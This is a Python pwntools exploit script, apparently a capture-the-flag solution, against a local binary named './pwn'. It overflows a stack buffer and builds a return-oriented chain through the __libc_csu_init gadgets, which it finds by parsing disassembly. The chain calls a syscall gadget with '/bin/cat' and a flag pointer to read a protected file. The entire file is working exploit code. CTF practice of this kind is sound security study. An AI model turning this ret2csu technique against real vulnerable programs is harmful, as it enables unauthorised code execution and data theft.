from pwn import *

binary = './pwn'
context(log_level='debug', arch='amd64', os='linux', binary=binary)

elf = ELF(binary)
s = process()
# gdb.attach(s, "b *0x04006C1\nc")
# s = gdb.debug(binary, "b *0x04006C1\nc")  # type:process


def csu(rdi, rsi, rdx, func):
    payload = flat('A' * 8, 0, 1, func, rdi, rsi, rdx)
    return payload


def get_csu_address():
    csu_init_address = elf.symbols['__libc_csu_init']
    csu_init_disasm = elf.disasm(csu_init_address, 150)
    instructions = csu_init_disasm.split('ret', 1)[0] + 'ret'
    # print(instructions)

    instructions_rdx = instructions.rsplit('rdx,', 1)
    csu_exec = instructions_rdx[0].splitlines()[-1].split(':')[0].strip()
    csu_start = instructions.splitlines()[-8].split(':')[0].strip()

    csu_exec_int = int(csu_exec, 16)
    csu_start_int = int(csu_start, 16)
    return csu_exec_int, csu_start_int


csu_exec, csu_start = get_csu_address()

syscall_rax_ptr = elf.sym['gift3']
bin_cat_ptr = elf.sym['gift1']
# bin_sh =

bin_cat = elf.search(b'/bin/cat').__next__()
flag_ptr = elf.sym['gift2']
payload = flat('A' * 0x20, 0, csu_start, csu(bin_cat, flag_ptr, 0, syscall_rax_ptr), csu_exec)
s.send(payload)
s.interactive()
